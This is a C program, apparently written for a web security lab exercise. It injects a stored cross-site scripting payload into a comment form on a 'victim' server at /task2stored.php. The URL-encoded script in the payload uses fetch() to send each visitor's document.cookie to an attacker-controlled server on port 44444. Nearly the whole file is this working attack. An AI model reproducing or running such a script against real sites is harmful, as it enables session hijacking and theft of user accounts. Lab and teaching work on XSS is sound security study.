#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define REQUEST_BUF_SZ 4096
#define RESPONSE_BUF_SZ 4096
#define PAYLOAD_BUF_SZ 1024
#define VICTIM_HOST "192.168.1.203"
#define VICTIM_PORT 80
#define ATTACKER_SERVER_HOST "192.168.1.201"
#define ATTACKER_SERVER_PORT_STR "44444"
// Plain payload: <script>fetch(`http://attack_host:attacker_port/${document.cookie}`,{mode:'no-cors'})</script>
#define PAYLOAD_URL_ENCODED "%3Cscript%3Efetch%28%60http%3A%2F%2F" ATTACKER_SERVER_HOST "%3A" ATTACKER_SERVER_PORT_STR "%2F%24%7Bdocument.cookie%7D%60%2C%7Bmode%3A%27no-cors%27%7D%29%3C%2Fscript%3E"

int create_victim_socket() {
    int sockfd;
    struct sockaddr_in server_addr;
    int opt = 1;

    // Initialize socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }

    // Set socket options
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        close(sockfd);
        return -1;
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        close(sockfd);
        return -1;
    }

    // Build web server address struct
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(VICTIM_PORT);
    if (inet_pton(AF_INET, VICTIM_HOST, &server_addr.sin_addr) <= 0) {
        close(sockfd);
        return -1;
    }

    // Connect to victim
    if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1;
    }

    return sockfd;
}

void build_http_message(char *request, size_t buffer_len) {
    // Write body (url encoding is pre applied to the payload)
    char body[PAYLOAD_BUF_SZ] = {0};
    snprintf(body, sizeof(body), "comment=%s", PAYLOAD_URL_ENCODED);

    // Build HTTP request
    snprintf(request, buffer_len,
             "POST /task2stored.php HTTP/1.1\r\n"
             "Host: 192.168.1.203\r\n"
             "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0\r\n"
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
             "Accept-Encoding: gzip, deflate, br, zstd\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: %lu\r\n"
             "Origin: http://192.168.1.203\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s", strlen(body), body);
}

int poison_db() {
    char request[REQUEST_BUF_SZ], response[RESPONSE_BUF_SZ];

    int sockfd = create_victim_socket();
    if (sockfd < 0) {
        return -1;
    }

    // Build payload
    build_http_message(request, sizeof(request));

    size_t total_len = strlen(request);
    size_t bytes_sent_total = 0;
    ssize_t bytes_sent;

    // Send request
    while (bytes_sent_total < total_len) {
        bytes_sent = send(sockfd, request + bytes_sent_total, total_len - bytes_sent_total, 0);
        if (bytes_sent < 0) {
            close(sockfd);
            return -1;
        }
        bytes_sent_total += (size_t)bytes_sent; // Since we know at this point n is non-negative there is no problem in coercing
    }

    // Receive response
    ssize_t bytes_received;
    while ((bytes_received = recv(sockfd, response, sizeof(response) - 1, 0)) > 0) {
        response[bytes_received] = '\0';
    }

    if (bytes_received < 0) {
        close(sockfd);
        return -1;
    }

    // Cleanup
    close(sockfd);
    return 0;
}

int main() {
    return poison_db();
}
